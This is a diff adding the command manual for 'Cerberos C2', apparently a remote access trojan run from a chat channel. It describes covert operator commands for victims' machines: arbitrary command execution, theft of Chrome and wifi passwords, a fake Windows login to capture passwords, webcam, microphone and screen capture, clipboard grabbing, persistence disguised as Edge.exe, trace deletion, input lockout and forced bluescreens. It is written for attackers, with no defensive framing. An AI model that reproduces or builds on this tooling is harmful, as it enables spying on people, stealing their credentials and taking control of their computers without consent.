@@ -1,0 +1,71 @@
+# Cerberos C2
+!list 				       >> Display all active client's.
+!info {ID} 			       >> Displays Version of client.
+!terminate {ID} 		       >> Close's Application. Wich results to lose of control of client.
+!resetID 			       >> Resets all ID's of clients. New ID's will be used after the program restarts.
+
+
+# System
+!cmd {ID} {INPUT}		       >> Executes a system command on client. Change {Input} To command.
+!destruct {ID} 			       >> Delets all trace's of Cerberos C2.
+!reboot {ID}                           >> Reboots Client's system.
+!shutdown {ID}                         >> Shutsdowb Client's system.
+!usbcheck {ID} 			       >> Checks all pluged in device's.
+!vm {ID}			       >> Checks if client is vm.
+!wcd {ID}			       >> Get Current working dir.
+!allproc {ID} 			       >> Lists all current curring processes.
+!showerror {ID} {TITLE} {MESSAGE}      >> Shows error message. Change {TITLE} To your own title and {MESSAGE} TO your own message.
+!clipboard {ID} 		       >> Gets Client clipboard.
+!cd {ID} {DIR}		               >> Change dir to dir given.
+!wallpaper {ID} {PATH}                 >> Changes walpaper to given dir. NOTE: "GIVE WHOLE DIR, else the wallpaper is black".
+!volumemax {ID}			       >> Maxes out the volume of client.
+!volumedown {ID} 		       >> Set's volume to zero of client.
+!say {ID} {TEXT} 		       >> Get a voice to say {TEXT}.
+!url {ID} {URL} 		       >> Opens {URL} in browser. 
+!winlogin {ID} 			       >> Create's a fake window login to try to get a password.
+!taskkill {ID} {TASK} 		       >> Kill's a task. Either the id or name.
+!wifipw {ID} 			       >> Extracts wifi passwords.
+!bluescreen {ID} 		       >> Bluescreen's client.
+!window {ID} 			       >> Get client window text. 
+
+# Files
+!upload {ID} {LINK} {NAME} / {PATH}    >> Uploads a file. Trough link. you can upload a file in the #upload channel and copy link from there. Enter file or path to store file.
+!download {ID} {FILE}		       >> Downloads file from client. 
+!remove {ID} {FILE} 		       >> Removes file from client
+!mkdir 				       >> Make's a dir on client.
+
+#Mouse / Keys    		       
+!key {ID} {KEY} 		       >> Clicks Key given on clients keyboard change {KEY} with the key.
+!morekey {ID} {KEY} 		       >> Clicks multiple Key given on clients keyboard change {KEY} with the key's.
+!mousemove {ID} {coordinates} 	       >> Move's client mouse to given coordinates.
+!mouseclick {ID} {coordinates} 	       >> Clicks on coordinates given.
+!mouysedoubleclick {ID} {coordinates}  >> Double clicks on coordinates given.
+
+
+# Cam
+!screenshot {ID} 		       >> Takes a screenshot of client.
+!frontcam {ID}    		       >> Takes a picture of client's frontcam.
+!mic {ID}			       >> Records MIC from client for 9 seconds.
+!camcount {ID} 			       >> Counts all systemcams.
+
+# IP
+!ipinfo {ID}			       >> Displays IP info of client. Country, Region etc.
+!ipmap {ID} 			       >> Converts IP Lat, Long of client to a map.
+
+#admin
+!admincheck {ID}                       >> Checks for admin rights.
+!block {ID} 			       >> Blocks input, keyboard, mouse.
+!unblock {ID} 			       >> Unblocks input. 
+!displayoff {ID} 		       >> Blocks client input and set a black screen.
+!displayon {ID} 		       >> Unblock client input and removes blackscreen. 
+
+#persist
+!persist {ID}			       >> Creates persistance on client. Exe: Edge.exe Regname: Edge.
+!peristcheck {ID}		       >> Checks for persistance on client.
+!persistdelete {ID}                    >> Tries to delete persistance.
+
+# Chrome
+!chromehistory {ID}		       >> Gets Chrome history of client. 
+!chromecred {ID} 		       >> Extracts Chrome passwords.
+#Rick
+!rickroll {ID}			       >> Open's a rickroll video.
